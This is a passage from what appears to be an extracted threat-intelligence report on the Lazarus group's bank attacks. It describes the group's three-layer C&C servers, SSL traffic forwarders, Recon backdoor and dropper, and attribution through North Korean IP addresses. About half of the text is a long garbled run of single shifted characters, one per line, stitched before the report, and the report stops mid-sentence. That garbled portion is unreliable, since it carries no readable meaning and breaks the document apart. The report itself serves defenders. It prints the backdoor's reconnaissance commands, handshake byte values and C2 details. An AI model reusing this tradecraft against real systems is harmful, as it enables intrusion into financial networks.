D\nI\nS\nF\nQ\nP\nS\nU\nT\n!\nB\nN\nO\nF\nT\nU\nZ\nP\nS\nH\nP\nS\nV\nT\nF\n\"\nN\nO\nF\nT\nU\nZ\nT\nT\nF\nD\nV\nS\nF\nE\nS\nP\nQ\nC\nP\nY\nI\nU\nU\nQ\nT\n\u02d9\nB\nN\nM\nF\nB\nP\nS\nH\nF\nO\n6\nR\nP\nH\nW\nL\nS\nV\nW\nR\nS\nU\nR\nW\nH\nF\nW\n\\\nR\nX\nU\nV\nH\nO\nI\nD\nJ\nD\nL\nQ\nV\nW\nb\nS\nK\nL\nV\nK\nL\nQ\nJ\n#\nF\nD\nB\nS\nF\nG\nV\nM\nX\nJ\nU\nI\nM\nJ\nO\nL\nT\n\u02d9\nC\nF\nG\nP\nS\nF\nD\nM\nJ\nD\nL\nJ\nO\nH\nB\nM\nJ\nO\nL\nP\nS\nC\nV\nU\nU\nP\nO\nP\nO\nB\nO\nF\nN\nB\nJ\nM\nD\nI\nF\nD\nL\nX\nI\nF\nS\nF\nJ\nU\nJ\nT\nS\nF\nE\nJ\nS\nF\nD\nU\nJ\nO\nH\nZ\nP\nV\nU\nP\n:\nP\nV\nD\nB\nO\nV\nT\nV\nB\nM\nM\nZ\nE\nP\nU\nI\nJ\nT\nC\nZ\n I\nP\nW\nF\nS\nJ\nO\nH\nZ\nP\nV\nS\nN\nP\nV\nT\nF\nQ\nP\nJ\nO\nU\nF\nS\nP\nW\nF\nS\nU\nI\nF\nM\nJ\nO\nL\nP\nS\nC\nV\nU\nU\nP\nO\n\u02dd\nZ\nP\nV\nD\nB\nO\nB\nM\nT\nP\nl\nO\nE\nP\nV\nU\nC\nZ\nS\nJ\nH\nI\nU\nD\nM\nJ\nD\nL\nJ\nO\nH\nB\nO\nE\nD\nP\nQ\nZ\nJ\nO\nH\nU\nI\nF\nM\nJ\nO\nL\n*\nG\nB\nO\nF\nN\nB\nJ\nM\nU\nF\nM\nM\nT\nZ\nP\nV\nJ\nU\nT\nU\nB\nL\nJ\nO\nH\nZ\nP\nV\nU\nP\n'\nB\nD\nF\nC\nP\nP\nL\nP\nS\n(\nN\nB\nJ\nM\nC\nV\nU\nU\nI\nF\nM\nJ\nO\nL\nE\nP\nF\nT\nO\nU\nM\nP\nP\nL\nM\nJ\nL\nF\nM\nJ\nL\nF\nB\n'\nB\nD\nF\nC\nP\nP\nL\nP\nS\n(\nP\nP\nH\nM\nF\nB\nE\nE\nS\nF\nT\nT\nU\nI\nF\nO\nU\nI\nF\nS\nF\nN\nJ\nH\nI\nU\nC\nF\nT\nP\nN\nF\nU\nI\nJ\nO\nH\nX\nS\nP\nO\nH\n*\nG\nZ\nP\nV\nS\nF\nO\nP\nU\nT\nV\nS\nF\nU\nZ\nQ\nF\nU\nI\nF\nB\nE\nE\nS\nF\nT\nT\nZ\nP\nV\nS\nT\nF\nM\nG\nB\nO\nE\nM\nP\nH\nJ\nO\n&\nO\nB\nC\nM\nF\nU\nX\nP\nG\nB\nD\nU\nP\nS\nB\nV\nU\nI\nF\nO\nU\nJ\nD\nB\nU\nJ\nP\nO\n\u02d9\nU\nX\nP\nG\nB\nD\nU\nP\nS\nB\nV\nU\nI\nF\nO\nU\nJ\nD\nB\nU\nJ\nP\nO\nJ\nT\nB\nO\nF\nY\nU\nS\nB\nT\nU\nF\nQ\nZ\nP\nV\nO\nF\nF\nE\nU\nP\nM\nP\nH\nJ\nO\nU\nP\nZ\nP\nV\nS\nB\nD\nD\nP\nV\nO\nU\n*\nO\nN\nP\nT\nU\nD\nB\nT\nF\nT\nJ\nU\nT\nW\nF\nS\nZ\nT\nJ\nN\nQ\nM\nF\nB\nO\nE\nZ\nP\nV\nP\nO\nM\nZ\nO\nF\nF\nE\nU\nP\nE\nP\nJ\nU\nX\nI\nF\nO\nZ\nP\nV\nV\nT\nF\nB\nO\nF\nX\nE\nF\nW\nJ\nD\nF\nP\nS\nP\nO\nD\nF\nF\nW\nF\nS\nZ\nG\nF\nX\nX\nF\nF\nL\nT\n.\nP\nT\nU\nD\nP\nN\nN\nP\nO\nM\nZ\nZ\nP\nV\nX\nJ\nM\nM\nC\nF\nS\nF\nR\nV\nJ\nS\nF\nE\nU\nP\nQ\nS\nP\nW\nJ\nE\nF\nB\nT\nJ\nY\nE\nJ\nH\nJ\nU\nD\nP\nE\nF\nE\nF\nM\nJ\nW\nF\nS\nF\nE\nU\nI\nS\nP\nV\nH\nI\nZ\nP\nV\nS\nQ\nI\nP\nO\nF\nF\nJ\nU\nI\nF\nS\nU\nI\nS\nP\nV\nH\nI\nB\nO\n4\n.\n4\nN\nF\nT\nT\nB\nH\nF\nP\nS\nQ\nS\nF\nG\nF\nS\nB\nC\nM\nZ\nU\nI\nS\nP\nV\nH\nI\nB\nN\nP\nC\nJ\nM\nF\nB\nQ\nQ\nM\nJ\nL\nF\n(\nP\nP\nH\nM\nF\n\"\nV\nU\nI\nF\nO\nU\nJ\nD\nB\nU\nP\nS\n\"\nV\nU\nI\nZ\nP\nS\n%\nV\nP\n.\nP\nC\nJ\nM\nF\n8\nI\nJ\nM\nF\nJ\nU\nN\nJ\nH\nI\nU\nB\nQ\nQ\nF\nB\nS\nU\nF\nE\nJ\nP\nV\nT\nB\nU\nl\nS\nT\nU\nU\nI\nJ\nT\nQ\nS\nP\nD\nF\nT\nT\nN\nB\nL\nF\nT\nJ\nU\nB\nM\nP\nU\nI\nB\nS\nE\nF\nS\nU\nP\nI\nB\nD\nL\nZ\nP\nV\nS\nP\nO\nM\nJ\nO\nF\nB\nD\nD\nP\nV\nO\nU\nT\nB\nT\nZ\nP\nV\nS\nQ\nB\nT\nT\nX\nP\nS\nE\nT\nB\nM\nP\nO\nF\nX\nP\nV\nM\nE\nO\nU\nC\nF\nT\nV\n\u00d3\nD\nJ\nF\nO\nU\nU\nP\nB\nD\nD\nF\nT\nT\nU\nI\nF\nN\n.\nB\nO\nZ\nQ\nP\nQ\nV\nM\nB\nS\nT\nF\nS\nW\nJ\nD\nF\nT\nI\nB\nW\nF\nU\nX\nP\nG\nB\nD\nU\nP\nS\nB\nV\nU\nI\nF\nO\nU\nJ\nD\nB\nU\nJ\nP\nO\nJ\nO\nD\nM\nV\nE\nJ\nO\nH\n(\nN\nB\nJ\nM\n0\nV\nU\nM\nP\nP\nL\n'\nB\nD\nF\nC\nP\nP\nL\nB\nO\nE\n5\nX\nJ\nU\nU\nF\nS\n:\nP\nV\nD\nB\nO\nS\nF\nB\nE\nN\nP\nS\nF\nE\nF\nU\nB\nJ\nM\nT\nP\nO\nU\nX\nP\nG\nB\nD\nU\nP\nS\nB\nV\nU\nI\nF\nO\nU\nJ\nD\nB\nU\nJ\nP\nO\nI\nF\nS\nF\n#\nF\nX\nB\nS\nZ\nP\nG\nT\nU\nS\nB\nO\nH\nF\nS\nT\n\u02d9\nJ\nG\nT\nP\nN\nF\nP\nO\nF\nZ\nP\nV\nE\nP\nO\nU\nL\nO\nP\nX\nD\nP\nO\nU\nB\nD\nU\nT\nZ\nP\nV\nB\nO\nE\nT\nU\nB\nS\nU\nT\nB\nT\nL\nJ\nO\nH\nZ\nP\nV\nG\nP\nS\nQ\nF\nS\nT\nP\nO\nB\nM\nE\nF\nU\nB\nJ\nM\nT\nD\nP\nO\nU\nB\nD\nU\nE\nF\nU\nB\nJ\nM\nT\nB\nO\nE\nO\nB\nN\nF\nT\nP\nG\nQ\nF\nP\nQ\nM\nF\nZ\nP\nV\nL\nO\nP\nX\nU\nS\nF\nB\nU\nJ\nU\nX\nJ\nU\nI\nT\nV\nT\nQ\nJ\nD\nJ\nP\nO\n\"\nT\nJ\nN\nQ\nM\nF\nS\nV\nM\nF\nJ\nT\n\u02d9\nJ\nG\nZ\nP\nV\nX\nP\nV\nM\nE\nO\nU\nT\nI\nB\nS\nF\nJ\nU\nP\nO\nU\nX\nJ\nU\nU\nF\nS\nE\nP\nO\nU\nT\nI\nB\nS\nF\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nX\nJ\nU\nI\nT\nP\nN\nF\nP\nO\nF\nZ\nP\nV\nE\nP\nO\nU\nL\nO\nP\nX\nF\nW\nF\nO\nJ\nG\nJ\nU\nJ\nT\nT\nP\nN\nF\nP\nO\nF\nX\nI\nP\nB\nQ\nQ\nF\nB\nS\nT\nU\nP\nI\nB\nW\nF\nG\nS\nJ\nF\nO\nE\nT\nP\nO\nT\nP\nD\nJ\nB\nM\nN\nF\nE\nJ\nB\nJ\nO\nD\nP\nN\nN\nP\nO\nX\nJ\nU\nI\nZ\nP\nV\n\"\nT\nX\nF\nM\nF\nB\nS\nO\nF\nE\nG\nS\nP\nN\nU\nI\nJ\nT\nD\nB\nN\nQ\nB\nJ\nH\nO\nB\nU\nU\nB\nD\nL\nF\nS\nT\nE\nP\nD\nP\nN\nN\nP\nO\nM\nZ\nC\nF\nG\nS\nJ\nF\nO\nE\nN\nB\nO\nZ\nQ\nF\nP\nQ\nM\nF\nU\nP\nM\nF\nW\nF\nS\nB\nH\nF\nD\nP\nN\nN\nP\nO\nT\nP\nD\nJ\nB\nM\nD\nP\nO\nO\nF\nD\nU\nJ\nP\nO\nT\nB\nT\nB\nX\nB\nZ\nU\nP\nB\nQ\nQ\nF\nB\nS\nN\nP\nS\nF\nD\nS\nF\nE\nJ\nC\nM\nF\nB\nO\nE\nM\nF\nH\nJ\nU\nJ\nN\nB\nU\nF\n$\nF\nN\nQ\nR\nZ\nO\nH\nG\nJ\nH\nP\nH\nQ\nW\nV\n5\nI\nJ\nT\nS\nF\nQ\nP\nS\nU\nJ\nT\nU\nI\nF\nQ\nS\nP\nE\nV\nD\nU\nP\nG\nJ\nO\nW\nF\nT\nU\nJ\nH\nB\nU\nJ\nP\nO\nT\nC\nZ\n$\nM\nB\nV\nE\nJ\nP\n(\nV\nB\nS\nO\nJ\nF\nS\nJ\n4\nI\nF\nS\nJ\nG\n&\nM\nT\nB\nZ\nF\nE\n\"\nM\nJ\n\"\nT\nI\nN\nJ\nU\nB\n4\nB\nQ\nL\nP\nU\nB\nB\nO\nE\nP\nU\nI\nF\nS\nT\nB\nU\n\"\nN\nO\nF\nT\nU\nZ\n*\nO\nU\nF\nS\nO\nB\nU\nJ\nP\nO\nB\nM\nB\nO\nE\nX\nJ\nU\nI\nU\nI\nF\nI\nF\nM\nQ\n$\nP\nM\nM\nJ\nO\n\"\nO\nE\nF\nS\nT\nP\nO\n8\nF\nX\nP\nV\nM\nE\nB\nM\nT\nP\nM\nJ\nL\nF\nU\nP\nU\nI\nB\nO\nL\nB\nM\nM\nU\nI\nP\nT\nF\nU\nB\nS\nH\nF\nU\nF\nE\nX\nI\nP\nD\nB\nN\nF\nG\nP\nS\nX\nB\nS\nE\nU\nP\nT\nI\nB\nS\nF\nJ\nO\nG\nP\nS\nN\nB\nU\nJ\nP\nO\nP\nO\nU\nI\nF\nT\nF\nB\nU\nU\nB\nD\nL\nT\n6\nH\nF\nX\nU\nL\nW\n\\\n,\nQ\nG\nL\nF\nD\nW\nR\nU\nV\n'\nP\nM\nM\nP\nX\nJ\nO\nH\nB\nS\nF\nE\nF\nU\nB\nJ\nM\nT\nV\nT\nF\nG\nV\nM\nG\nP\nS\n*\nO\nU\nF\nS\nO\nF\nU\n4\nF\nS\nW\nJ\nD\nF\n1\nS\nP\nW\nJ\nE\nF\nS\nT\nB\nO\nE\nU\nI\nF\nT\nF\nD\nV\nS\nJ\nU\nZ\nD\nP\nN\nN\nV\nO\nJ\nU\nZ\nU\nP\nG\nV\nS\nU\nI\nF\nS\nS\nF\nT\nF\nB\nS\nD\nI\nB\nO\nE\nJ\nN\nQ\nM\nF\nN\nF\nO\nU\nB\nQ\nQ\nS\nP\nQ\nS\nJ\nB\nU\nF\nE\nF\nG\nF\nO\nT\nF\nT\n   ", "LAZARUS\n \nARISEN\nARCHITECTURE / TOOLS / ATTRIBUTION\n 2\nINTRODUCTION\nIn February 2016, hackers reportedly attempted to steal approximately \n \n1 billion USD from the Central Bank of Bangladesh through SWIFT. In February \n\n2017, several Polish banks were compromised.\nSecurity researchers analysed the malware code, chie\u02dcy using this to attribute \nactivity to Lazarus group. As tools are often reused by different groups, while \n\nhelpful, malware analysis does not provide conclusive evidence of attribution.\nGroup-IB researchers investigating Lazarus group collected a broad range \nof data, both technical and strategic, which places clear attribution on North \nKorea. The team detected and thoroughly analyzed multiple layers of C&C \ninfrastructure used by Lazarus and have identi\u02daed North Korean IP addresses \nfrom which the attacks were ultimately controlled. The following report is \nan overview of this group\u2122s attack methodology for \u02danancial institutions, the \nmalware employed and review of their targets.\n 3\nThrough analysis of Lazarus activity, Group-IB gained deep insight on a \ncomplex botnet infrastructure built by the hacker group to conduct their \n\nattacks. To mask malicious activity, the hackers used a three-layer architecture \n\nof compromised servers with SSL encrypted channels established between \n\nthem. In addition to encrypted tra\u02dbc, data sent through SSL channel was \n\nadditionally encrypted.  The attackers achieved anonymity by employing a \n\nlegitimate VPN client - SoftEther VPN. In some cases, they also used corporate \n\nweb servers that were part of the attacked infrastructure. \nTo control infected machines, the hackers employed multi-module tools, \nattempting to complicate malware analysis. That said, they managed to \n\nconduct several successful attacks without employing 0day exploits. Lazarus \n\ndemonstrated a \u02dcexible approach to attacks by applying different hacking tools, \n\nwhich prevented their detection by endpoint security solutions.\n \n \n\n \nAccording to our investigation of the Lazarus infrastructure, the threat actors \nconnected to the end C&C layer (Layer3) from two North Korean IP addresses \n\n210.52.109.22 and 175.45.178.222. \nThe second IP-address relates to Potonggang \nDistrict, perhaps coincidentally, where National Defence Commission is \nlocated \u0160 the highest military body in North Korea\nAdditional evidence was con\u02darmed that Lazarus links to North Korean hackers \nby Group-IB specialists through analysis of pubic sources. We found a news \n\nreport from a South Korean Arirang TV agency, dated 2016, about an attack on \n\nSouth Korean television stations and banks as part of DarkSeoul operation.  This \n\nattack performed by North Korean hackers and was investigated by the South \n\nKorea\u2122s National Police Agency, who detected two IP addresses 175.45.178.19 and \n\n175.45.178.97, used by hackers to control malware. \nBoth IP addresses are in the \n\nsame block of IP addresses the IP 175.45.178.222, which was discovered by \n \nGroup-IB specialists.\nKEY \n \n\nFINDINGS\n01\nUnique tools \n \n\nand C&C infrastructure \nLinks to \n \nNorth Korea\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \nLazarus is purportedly controlled by Bureau 121, a division of the \nReconnaissance General Bureau, a North Korean intelligence agency. \n \n\nBureau 121 is responsible for conducting military cyber campaigns.\n 4\nSince 2016, the hackers have tried to mask their activity by pretending to \nbe Russian hackers. They added speci\u02dac debugging symbols and strings \n\ncontaining Russian words to a new version of Client_Tra\u02dbcForwarder, a \n\nmodule designed to proxy network tra\u02dbc. To protect their executables, \n\nthey used Enigma Protector, a commercial product, which was created by a \n\nRussian software developer. They also used exploits for Flash and SilverLight \n\nfrom sets of exploits created by Russian-speaking hackers.\nThese masquerade techniques did initially mislead some researchers who \nconducted express analysis of malicious code.\n \n \n\n \n\n \n\nA state-sponsored hacker group Lazarus managed to gain fraudulent \n\naccess to the SWIFT network of attacked banks. This is believed to be a \n\ngrowing trend: \nstate-sponsored hackers are demonstrating an increased \n\ninterest in conducting attacks on \u02dcnancial institutions, which are considered \n\na component of the national critical infrastructure in some countries. At the \n\nmoment, only a few similar incidents have been detected\n. For example, in \n2010-2013 the NSA reportedly penetrated the SWIFT banking network and \n\nmonitored a number of Middle East banks. In late 2016, attacks on Ukrainian \n\nbanks were conducted, allegedly as part of the BlackEnergy operation. \n\nHowever, researchers expect that the number of attacks on \u02danancial \n\ninstitutions by state-backed hackers may signi\u02dacantly increase in the future.\n \n \n\n \n\n \n\nThe earliest indicator of compromise detected by Group-IB  is dated March \n\n2016. This was directly after the Central Bank of Bangladesh incident, \n\nwhich took place in February 2016, where attackers attempted to steal $1 \n\nbillion USD. Only a spelling mistake in an online bank transfer instruction \n\nhelped prevent them from stealing more than $81 million USD. Following \n\nthis incident, the group modi\u02daed its tactics and tools, adapting them to the \n\nchanging environment and misleading researchers.\nThrough analysis of compromised networks, Group-IB identi\u02dced IP addresses \nof universities in the US, Canada, Great Britain, India, Bulgaria, Poland, \n\nTurkey, pharmaceutical companies in Japan and China, as well as government \n\nsubnets in various countries.\nEmerging trend\nVictims\nMasquerading \n \nas Russian hackers \n 5\nTo in\u02daltrate systems of their interest, Lazarus conducted watering-hole attacks \nleveraging compromised resources often visited by their potential victims, \n\nsuch as websites of \u02danancial regulators and government agencies in several \n\ncountries.  \n \n\n \n\nSome of these resources are listed below:\n \n\u0141\n \nknf.gov.pl\n \u0160 The Polish Financial Supervision Authority\n\u0141\n \ncnvb.gob.mx \n\u0160 National Banking and Securities Commission, Mexico\n\u0141\n \nbrou.com.uy\n \u0160 \n \nBanco de la Rep\u00fablica Oriental del Uruguay, a state-owned \n \n\nbank in Uruguay\nThrough examination of a code on a web server with exploits, Group-\n\nIB specialists detected a list of 255 IP address ranges. \nThat said, hackers \n\ninfected only those users who visited the website from a computer within the \n\nspeci\u02dced IP range. Based on this list, researchers have compiled a map of the \n\ncountries that were of interest to the attackers, which is presented below.\nATTACK \n\nPREPARATION AND \n\nIMPLEMENTATION\n2.1 \n \nInfection \n \nof web resources\n02\nTo conduct attacks, the criminals \n\ndeveloped toolsets to control C&C \n\nservers and infected machines, built \n\na three-layer C&C infrastructure, \n\nand compromised dozens of large \n\nweb resources.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 6\nTo gain access to websites of \u02danancial regulators and bank local networks, \nhackers used known vulnerabilities in JBoss and Liferay. They compiled an \n\nexploit for Silverlight CVE-2016-0034 (MS16-006) which earlier was included \n\ninto RIG and Angler exploit kits, they also used Flash exploits from Neutrino \n\nExploit Kit.\n \n \n\n \n\n \n\n \n\nAttackers created a 3-tier infrastructure that consisted of compromised \n\nservers, between which the hackers established SSL encrypted channels. The \n\nnetwork interaction with the attacked computer was carried out only from the \n\nLayer 1 server, which acted as a C&C server. In some cases, hackers placed the \n\nLayer 1 server inside the organization attacked in order to reduce the risk of \n\ndetection. \nThey gained access to these servers by brute forcing passwords for \n\nRDP.\n \nHackers used original set of tools:\n \nThrough in-depth analysis of the tools used by the attackers, Group-IB \n\nspecialists identi\u02daed the scheme of communications between nodes within \n\nthe C&C infrastructure.\n2.2 \n \nEstablishment of C&C \n\ninfrastructure:  \nServer_RAT\nUsed to manage windows-based server infrastructure\nServer_Tra\u02dacForwarder\nForwards tra\u02dcc from one external server to another  \nBackend_ Listener\nEstablishes connection with servers with installed Server_\n\nRAT, gets commands directly from the threat actor\nAdmin_Tool\nAdmin tool to send commands to infected computers\nSWIFT toolbox\nUsed to work with SWIFT, consists of Alliance software \n\nHook Files and SWIFT transactions Information \n\nHarvester.\n 7\nServer_RAT was installed on all infrastructure levels to control the \ncompromised infrastructure\n \n \n\nServer_RAT constantly listens on port 3365, to which attackers connected \n\nto control the server. To ensure the availability of the specified port, \n\nthe malicious program added a special rule to the firewall that allowed \n\nincoming connections to this port. Infected computers performed an \n\noutgoing connection to the compromised server acting as proxy via port \n\n443. Typically outbound connections on this port are allowed in corporate \n\nnetworks.\nBased on analysis of the Server_RAT functionality, Group-IB specialists \nidentified that Server_RAT responds to certain requests in a specific way. \n\nKeeping in mind that Server_RAT constantly keeps port 3365 open, we \nscanned the Internet for open ports 3365. Following this, we checked a \nlist of detected servers to identify those servers where Server_RAT was \ninstalled. \nAs a result, Group-IB specialists received a list of 74 IP addresses, \nwhich are presented in the Indicators of Compromise section.\nServer_Tra\u02dccForwarder was installed on the \u02darst and second server level \n\u0160 this module redirected tra\u02dcc from one server to another. \n \n \n\nIn some cases, Server_TrafficForwarder was installed on servers inside the \n\nattacked organization. \nThis approach allows the criminal to avoid detection \n\nof suspicious connections to the external network or bypass network \n\nconnection restrictions with prohibited connections to the external network \n\nfrom speci\u02dcc computers/servers, which is often applied by companies to \n\nprotect the most critical PCs, such as those of SWIFT operators. \nThree-layer C&C server infrastructure\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 8\nAfter the start, Server_Tra\u02dbcForwarder reads the contents of the key and \ncerti\u02dacate \u02dales from the root directory that will be used to create an SSL \n\ntunnel. That said, the \u02dale does not contain any information about the servers \n\nto which tra\u02dbc should be transferred. \nAt the \u02dcrst start, hackers manually \n\nspecify the port to listen on as well as the address of the C&C server to \n\nwhich tra\u02dac is to be sent. In the event the port is not speci\u02dced, the program \n\nlistens on a random port and waits for incoming connections.\n \nTo verify communication with a compromised server, hackers check if the \nclient is appropriate: they send the \u02darst network request; when a response \nis received from the client, they decrypt it and compare with a previously \nknown response. In the event the responses are different, the connection is \nbroken.\n \nThe table below contains all commands available:\nThe only difference in the Server_Tra\u02dbcForwarder con\u02daguration on Layer \n1 and Layer 2 servers respectively is that Server_Tra\u02dbcForwarder installed \n\non Layer 1 accepts tra\u02dbc from port 443 and forwards it on the same port \n\nof Layer 2. While Layer 2 accepts tra\u02dbc on port 443 and forwards it to port \n\n8080 of Layer 3.\nCommands\nDescription\n0x1095\n-\n0x1096\nCollects and sends system \n\ninformation\n0x10AA\nGets the con\u02daguration\n0x10AB\nChanges the con\u02daguration \n\n(including the port on which \n\nit listens for connections)\n0x10AE\n-\n0x10AF\n-\n0x10B3\nReads a private key \u02dale and \n\nsends it to the operator\n0x10B4\nRecords data to a \u02dale\nCommands\nDescription\nNONE\n-\nGINF\nCollects and sends system \n\ninformation\nGCFG\nGets the con\u02daguration \nSCFG\nChanges the con\u02daguration \n\n(including the port on which \n\nit listens connections) \nSLEP\n-\nHIBN\n-\nLCLR\nRecords data to a \u02dale\nLDWN\nReads a private key \u02dale and \n\nsends it to the operator\nCommands of the \u02darst version:\nCommands of the second version:\n 9\nTo encrypt all of its network connections, the tra\u02dbc forwarder uses the \nstatically linked wolfSSL libraries and SSL certi\u02dacates which are generated \n\nby a pre-de\u02daned template. The \ufb01Issued for\ufb01 \u02daeld always contains a third-level \n\ndomain slash an email address. \n \nA few examples are shown below:\n \n\u0141\n \nwww.res\u02danan.com/emailAddress=info@res\u02danan.com\n\u0141\n \n\u02danews.otzo.com/emailAddress=master@otzo.com\n\u0141\n \nhost.global.com/emailAddress=info@host.global.com\n\u0141\n \nlatest.ignorelist.com/emailAddress=consult@latest.ignorelist.com\n \nWith information about this template, Group-IB specialists managed to detect \nsimilar certi\u02dacates and associated hosts. With these indicators, you can check \n\nif your organization was, or is, under attack by Lazarus.\n \nBackend_Listener is software installed by attackers on Layer 3 servers. The \n\nprogram performs communications with other servers, receives commands \n\nfrom the administrator and sends them in chain order to the end infected \n\ncomputer.\n \nBackend_Listener listens on the two ports:\n\u0141\n \nport 8080, to which it accepts SSL connections from Layer 2 servers.\n\u0141\n \nport 9090, to which it accepts connections from the control system \n\n(Admin_Tool).\n \nTo encrypt tra\u02dbc, the wolfSSL open source library is used. After the \n\napplication is launched, the private key and certi\u02dacate \u02dales are loaded from \n\nthe root directory. These \u02dales are used to encrypt tra\u02dbc between the C&C \n\nserver and connected clients.\nTo defend against security solutions designed to \ufb01unpack\ufb02 SSL encrypted \ntra\u02dbc, Backend_Listener encrypts all data sent over an SSL channel using an \n\nadditional reversible encryption algorithm and performs legitimacy checks.  \nTo reverse-engineer the protocol of server communications with clients, \nGroup-IB specialists have developed a client that successfully connects to \n\nboth above-mentioned ports.\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 10\nThis allowed us to analyze communications between the Admin-Tool and \nBackend_Listener and we discovered that:\n \nAdmin_Tool must have an key pair that is identical to the server \n\nAdmin_Tool sends a customized Hello-package that differs from the one \nthat is provided by the library. By default this package (msg) is speci\u02dced in \n\nthe library as follows: \n \nAdmin_Tool sends an encrypted (special) packet with a length from the \n\nprevious packet (len). \nThe server decrypts the contents of the packet sent.After decryption, the \nfollowing conditions must be true:\n3\n4\nstatic unsigned char\n msg[4] = { 0x11, 0x00, 0x00, 0x00, };\nstatic unsigned char\n ecnrypted_str[17] = { 0x38, 0x94, 0x3C, 0x6A, 0x58, 0x39, \n0x1A, 0x56, 0x81, 0x4B, 0x09, 0x99, 0x1D, 0xE0, 0xCF, 0x81, 0x3F };\n(DWORD)&decrypted_buff[5] == len \n(DWORD)&decrypted_buff[15] == len\nwhere len is the length of the packet\n1\n2\nThe correct Hello packet that will be accepted by Backend_Listener must be of the \n\nfollowing form:\n \nIn fact, this is an information packet, rather than a Hello packet, and its \u02darst byte \n\ncontains the length of the next packet sent (\u00ablen\u00bb), while the rest bytes must be zero \n\nin this case.\n#ifndef\n WOLFSSL_ALT_TEST_STRINGS\nchar\n msg[32] = \n\u00abhello wolfssl!\u00bb\n;   \n/* GET may make bigger */\nstatic unsigned char\n msg[4] = { 0x11, 0x00, 0x00, 0x00, };\n 11\nAdmin_Tool  sends DWORD with len2 < 201 where len2 is the length of the \nnext package.  \nAdmin_Tool sends encrypted (special) package #2. It\u2122s length is determined \nin the previous package. \nServer decrypts the content of the package, and the following rules should \nwork there after decryption: \nVPN:\n the attackers installed SoftEther VPN (http://softether.net/) service \nsupported by University of Tsukuba, Japan on some servers to unsure \nadditional level of anonymity. \nLazarus have chosen this service for the following reasons:\n\u0141\n \nThis legitimate application isn\u2122t detected by security solutions \n\u0141\n \nIt\n \ncan establish\n \nVPN connection via ICMP or DNS to avoid detection by network \nsecurity solutions \n\u0141\n \nIt contains Dynamic DNS function, which means that if a compromised system has \na dynamic IP address, the attacker can always \u02dand it by DNS name connected to \n\nthe VPN client \n\u0141\n \nThis VPN client supports Windows, Linux, FreeBSD, Solaris, Mac OS X\n6\n7\nstatic unsigned char\n ecnrypted_str[17] = { \n \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, \n    0xC8, 0x88, 0xE0, 0xE4, 0x94, 0x85, 0xCC, 0xD1, 0x03, 0x00, \n(DWORD)&decrypted_buff[4] == 0xD1CC8594 \n \n(DWORD)&decrypted_buff[8] == 3\nOnly if all validity checks are made, the tra\u02dbc is forwarded from one port to another in 2 \nstreams. Following this, when the client connects to the \u02darst port (8080), the service will \n\nforward the tra\u02dbc from the \u02darst port to the second one, and back.\nThe operators connected to port 9090 of Layer 3 servers from the following IP \naddresses: \n- 210.52.109.22 (North Korea)\n- 175.45.178.222 (North Korea)\n- 157.7.135.182 (Japan) and 202.101.36.45 (China) - via SoftEther VPN\n5\n4 \n \nRecommendations\n1 \n  \nKey \n \nFindings \n2 \n  \nAttack \n \npreparation and \nimplementation\n3 \n  \nAttack \n \norganizers\n5 \n \nIndicators of \n\ncompromise\n6 Appendix\n \n 12\nIn addition to multi-layer server structure, hackers developed a specialized \ntoolset to perform remote control over infected PCs.\nThe group actively attempted to conceal their activity, complicating malware \ndetection and analysis as much as possible. All tools consist of modules, which \nwere delivered separately to target organizations only. To complicate malware \ninvestigation, criminals encrypted and obfuscated their tools.\nModular architecture of the victim\u2122s infection process provides both additional \n\u02dcexibility and anonymity throughout the cyber-attack. This scheme allows \n\nhackers to divide software development activity between teams, as well as to \n\nensure the reuse of program code.\nRecon is a backdoor that is initially installed on the target machine through \nsuccessful execution of exploits. This module is used by hackers to perform \n\ninitial reconnaissance to search for systems of interest. \nOnce launched, the program adds itself to the auto-start by copying its \u02dale \nto the directory \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\\n\nStart Menu\\Programs\\Startup\", collects data about the system and network \n\nenvironment and sends them to the C&C server. \n2.3 \n \nTools to control infected PCs \ncmd.exe /c hostname\n\ncmd.exe /c whoami\n\ncmd.exe /c ver\n\n\ncmd.exe /c ping www.google.com\n\ncmd.exe /c query user\n\ncmd.exe /c net user\n\ncmd.exe /c net view\n\ncmd.exe /c net view /domain\n\ncmd.exe /c reg query \u00abHKCU\\SOFTWARE\\Microsoft\\Windows\\\n\nCurrentVersion\\Internet Settings\u00bb\n\ncmd.exe /c tasklist /svc\n\nBelow is a list of data collected:\nRecon\nPerforms initial reconnaissance to determine if a systems is of \n\ninterest to the threat actors\nDropper\nExtracts and decrypts Loader\nLoader\nDecrypts the payload \u0160 Client_RAT or Client_Tra\u02dccForwarder \n\n\u0160 and injects into the legitimate process\nClient_Tra\u02dacForwarder\nForwards operator\u2122s commands from external network into \n\ncorporate network\nClient_RAT \nProvides full control over the target system\n 13\nIn the event the system is not of interest, the module will use the \"killkill\" \ncommand to remove itself from the infected system. If the system is of interest, \n\nthen Recon downloads Dropper using the \ufb01http\ufb02 command. Dropper will then \n\ninstall Client_RAT to the infected system as follows: \nDropper extracts and decrypts Loader, embeds it into the system and \nextracts Client_RAT.\nTo decrypt the con\u02daguration \u02dale, Dropper needs MD5 encryption key, which \nonly the attacker knows.\nGroup-IB specialists have analyzed two versions of Dropper. There are no \nfundamental differences between them: both versions were used to decrypt \n\nthe loader and encrypted payload, as well as to ensure loader persistence in \n\nthe system.\nArguments\nDescription\ndropper.exe -l\nEnumerates system \n\nservices\ndropper.exe  -e \n\n[path]\nRetrieves and decrypts \n\nencrypted payload and \nsaves it to the speci\u02daed 